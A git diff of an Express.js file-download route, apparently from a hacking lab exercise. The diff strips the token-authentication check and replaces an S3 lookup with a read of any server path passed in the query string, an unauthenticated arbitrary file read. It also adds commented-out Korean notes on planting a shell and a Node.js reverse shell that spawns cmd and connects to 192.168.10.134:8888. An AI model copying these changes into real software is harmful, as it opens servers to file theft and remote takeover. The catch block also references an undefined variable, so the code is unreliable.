@@ -17,46 +17,56 @@ const Readable = require('stream').Readable;
  */
 var fs = require('fs');
 const { response } = require("express");
-var { s3 } = require('../../../middlewares/s3Conn');
 
-router.get("/", validateUserToken, async (req, res) => {
+
+router.get("/", async (req, res) => {
+    // send to file localfile to client
     var r = new Response();
-    var file_id = decrypt(req.query.file_id);
-    console.log(file_id);
-    Model.file.findOne({
-        where: {
-            id: file_id
-        },
-        attributes: ["file_name", "saved_name"]
-    })
-    .then(async (data) => {
-        var options = {
-            Bucket: 'oh-s3-bucket',
-            Key: data.saved_name
-        };
+    var filename = req.query.filename;
+    console.log(filename);
+    try{
+        // var stat = fs.statSync(filename);
+        // var file = fs.createReadStream(filename);
+        // res.setHeader('Content-Length', stat.size);
+        // res.setHeader('Content-Type', 'application/octet-stream');
+        // filename = filename.split('/');
+        // filename = filename[filename.length - 1];
+        // res.setHeader('Content-Disposition', 'attachment; filename='+filename);
+        // file.pipe(res);
 
-        var fileStream = s3.getObject(options).createReadStream();
-        res.attachment(data.saved_name);
-        // r.status = statusCodes.SUCCESS;
-        // r.data = data;
-        // res.attachment(data.file_name);
-        // res.attachment(data.saved_name);
-        // file_data = fs.readFileSync("./upload/"+data.saved_name);
-        // s = new Readable();
-        // // s.push(encryptResponse(file_data).enc_data);
-        // s.push(file_data);
-        // s.push(null);
-        // s.pipe(res);
-        fileStream.pipe(res);
-    })
-    .catch((err) => {
+        file_data = fs.readFileSync(filename);
+        s = new Readable();
+        filename = filename.split('/');
+        filename = filename[filename.length - 1];
+        res.attachment(filename);
+        s.push(file_data);
+        s.push(null);
+        s.pipe(res);
+    }
+    catch{
         r.status = statusCodes.SERVER_ERROR;
         r.data = {
-            message: err.toString(),
+            message: error.stack,
         };
-        console.log(r.data);
         return res.json(encryptResponse(r));
-    });
+    }
 });
+
+//방법2. 쉘 js 업로드 후 연결.
+// router.use('/attack', require('./attack.js'));
+
+//방법 1. 파일 다운로드의 router 수정
+// router.get("/attack", function(){
+// 	var net = require("net"),
+// 		cp = require("child_process"),
+// 		sh = cp.spawn("cmd",[]);
+// 	var client = new net.Socket();
+// 	client.connect(8888,"192.168.10.134",function(){
+// 		client.pipe(sh.stdin);
+// 		sh.stdout.pipe(client);
+// 		sh.stderr.pipe(client);
+// 	});
+// 	return /a/;
+// });
 
 module.exports = router;
